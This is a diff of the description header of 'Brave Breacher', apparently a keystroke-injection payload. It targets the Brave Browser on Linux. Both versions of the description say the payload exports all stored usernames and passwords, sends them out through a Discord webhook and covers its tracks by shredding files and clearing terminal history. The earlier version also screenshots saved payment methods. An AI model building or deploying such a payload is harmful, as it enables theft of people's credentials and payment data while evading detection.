@@ -4,7 +4,7 @@ REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
 
 REM TARGET OS: Linux (tested on Pop!_OS) | Brave Browser Flatpak Version: 1.77.101
 
-REM DESCRIPTION: Brave Breacher is a side-channel attack payload that utilizes various methods to navigate the Brave Browser GUI. The payload has two phases: Phase 1, all username and password credentials stored in the browser are exported to be exfiltrated. Phase 2, the payload then navigates to the payment method settings menu and screenshots the stored payment method. The files are then moved to the /Pictures/Screenshots directory, tarballed, and then exfiltrated via Discord webhook. All files in the /Pictures/Screenshots directory are then shredded, the terminal history is cleared, and all windows opened are closed to obfuscate activity. To be functional: insert USER to lines 68/78, add Discord webhook to line 76.
+REM DESCRIPTION: Brave Breacher is a side-channel attack payload that utilizes various methods to navigate the Brave Browser GUI. The payload exports a copy of all usernames and passwords stored in the Brave Browser Password Manager. It then exfiltrates the file via discord webhook and obfuscates its' activity by closing all opened windows, clearing the terminal history, and shredding the exported 'Brave Password.csv' file once exfiltrated. To be operable, place Discord webhook in #WEBHOOK_URL constant on line 6.
 
 ![bbdemo](https://github.com/user-attachments/assets/1c0776ed-2c0f-477f-94ea-87ab4fd95066)
 
